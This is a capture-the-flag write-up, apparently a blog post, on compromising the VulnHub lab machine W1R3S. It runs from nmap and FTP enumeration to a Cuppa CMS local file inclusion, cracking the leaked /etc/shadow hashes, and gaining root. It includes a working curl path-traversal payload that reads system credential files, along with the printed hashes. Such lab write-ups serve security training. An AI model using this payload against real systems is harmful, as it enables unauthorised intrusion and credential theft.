---
layout: post
title: W1R3S
date: 2020-07-06
author: the-bilal-rizwan
comments: true
categories: vulnhub
tags: [ctf,vulnhub]
---

## Recon

After configuring the W1R3S: 1.0.1 and getting its ip through  nmap. I quicky ran a nmap scan 

#### Nmap results

```perl

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.174.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

````

#### Enumeration

**FTP**

I originally started off with the ftp anonymous login and found 3 folders one contained usernames the rest were just trolls e.g one of the files contained the following test 

```bash
New FTP Server For W1R3S.inc
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==

```
I decoded the base64 string and decoded to `It is easy, but not that easy..`

**Web**

Next I went on to enumerate the web apps since that seemed to be the most likely way of getting in the server.

I found out that its running Cuppa CMS. I did a quick google search and found this exploit 
https://www.exploit-db.com/exploits/25971

Though this did not work the file did load up but nothing came up on the page. 

I downloaded the source code of the app from https://github.com/CuppaCMS/CuppaCMS and started to dig in myself to verify if the vuln listed on exploit-db exited. 

from the exploit on exploit-db the problem was in `/alerts/alertConfigField.php (LINE: 22)`

![exploit db image]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/exploitdb.png)

I did a quick grep on the mentioned page but nothing came up


![grep nothing found]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/grep1.png)

Then I begain to analyze the code further and I saw the following

![grep found]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/grep2.png)

and finally using this information I was able to exploit the LFI

```bash

curl -X POST --data "urlConfig=../../../../../../../../../etc/passwd" http://192.168.174.140/administrator/alerts/alertConfigField.php
```
![lfi]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/lfi.png)


#### Exploitation

I was able to read the /etc/shadow file 

```bash
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::

```

used `hashcat` and rockyou.txt to crack the passwords


![hashcat]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/hashcat.png)

and logged in with user `w1r3s`

![ssh]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/ssh.png)


#### Priv Esec

I just simply ran `sudo su` and entered the password computer and voila! got root

![root]({{ site.giturl }}/MyCtfWriteups/assets/images/Vulnhub/w1r3s/root.png)
